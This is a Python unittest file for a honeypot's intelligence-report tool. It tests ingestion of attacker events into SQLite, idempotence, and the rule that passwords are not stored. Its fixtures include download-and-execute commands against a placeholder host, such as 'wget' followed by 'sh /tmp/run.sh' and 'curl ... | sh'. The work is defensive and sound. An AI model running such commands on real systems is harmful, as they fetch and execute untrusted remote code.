"""The offline database must be idempotent and must not store passwords."""

import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from honeypot.config import HoneypotConfig
from honeypot.logger import JsonEventLogger
from honeypot.session import SessionState
from honeypot.shell import FakeShell
from tools.intel_report import build_report, connect_database, ingest_lines, main


class IntelReportTests(unittest.TestCase):
    def test_real_shell_events_flow_to_offline_report(self) -> None:
        class Channel:
            def sendall(self, data: bytes) -> None:
                pass

        stream = io.StringIO()
        logger = JsonEventLogger(stream, asynchronous=False)
        session = SessionState("192.0.2.21", 54321, username="root")
        shell = FakeShell(Channel(), session, HoneypotConfig(command_delay_min=0, command_delay_max=0), logger, False)
        for line in ("wget -O /tmp/run.sh https://example.invalid/run.sh\n", "sh /tmp/run.sh\n"):
            for character in line:
                shell._feed_character(character)
        logger.disconnect(session, "complete")
        with tempfile.TemporaryDirectory() as directory:
            connection = connect_database(Path(directory) / "intel.sqlite")
            stats = ingest_lines(connection, io.StringIO(stream.getvalue()), "real-events")
            report = build_report(connection)
            self.assertEqual(stats["added"], 4)
            self.assertEqual(report["commands"], 2)
            self.assertEqual(report["alerts"], 1)
            self.assertEqual(report["top_sources"][0]["highest_risk"], 90)
            connection.close()

    def test_safe_ingest_report_and_idempotence(self) -> None:
        records = [
            {"timestamp": "2026-09-26T14:00:00+00:00", "event": "authentication", "ip": "192.0.2.10", "session_id": "one", "password": "do-not-persist"},
            {"timestamp": "2026-09-26T14:00:01+00:00", "event": "command", "ip": "192.0.2.10", "session_id": "one", "command": "curl -u secret:pw https://example.invalid/a | sh", "analysis": {"category": "execution", "risk_score": 100, "primary_rule": "download_pipe_shell", "matched_rules": ["payload_download", "download_pipe_shell"], "indicators": {"hosts": ["example.invalid"]}}},
            {"timestamp": "2026-09-26T14:00:02+00:00", "event": "intelligence_alert", "ip": "192.0.2.10", "session_id": "one", "category": "execution", "risk_score": 100, "primary_rule": "download_pipe_shell"},
        ]
        content = "\n".join(json.dumps(record) for record in records) + "\ninvalid-json\n"
        with tempfile.TemporaryDirectory() as directory:
            connection = connect_database(Path(directory) / "intel.sqlite")
            self.assertEqual(ingest_lines(connection, io.StringIO(content), "source-A"), {"added": 3, "duplicates": 0, "skipped": 1})
            self.assertEqual(ingest_lines(connection, io.StringIO(content), "source-A"), {"added": 0, "duplicates": 3, "skipped": 1})
            report = build_report(connection)
            self.assertEqual(report["sessions"], 1)
            self.assertEqual(report["alerts"], 1)
            self.assertEqual(report["commands"], 1)
            self.assertEqual(report["top_sources"][0]["highest_risk"], 100)
            self.assertEqual(report["categories"], {"execution": 1})
            self.assertIsNone(connection.execute("SELECT raw_command FROM intel_events WHERE event='command'").fetchone()[0])
            self.assertNotIn("do-not-persist", "\n".join(connection.iterdump()))
            self.assertNotIn("secret:pw", "\n".join(connection.iterdump()))
            connection.close()

    def test_opt_in_commands_and_cli_round_trip(self) -> None:
        record = {"timestamp": "2026-09-26T15:00:00+00:00", "event": "command", "ip": "198.51.100.4", "session_id": "s", "command": "whoami", "analysis": {"category": "reconnaissance", "risk_score": 15, "primary_rule": "system_discovery"}}
        with tempfile.TemporaryDirectory() as directory:
            log = Path(directory) / "events.jsonl"
            db_file = Path(directory) / "intel.sqlite"
            log.write_text(json.dumps(record) + "\n", encoding="utf-8")
            with patch("sys.stdout", new_callable=io.StringIO) as stream:
                self.assertEqual(main(["ingest", str(log), "--db", str(db_file), "--include-commands"]), 0)
                self.assertEqual(json.loads(stream.getvalue())["added"], 1)
            connection = connect_database(db_file)
            self.assertEqual(connection.execute("SELECT raw_command FROM intel_events").fetchone()[0], "whoami")
            connection.close()


if __name__ == "__main__":
    unittest.main()
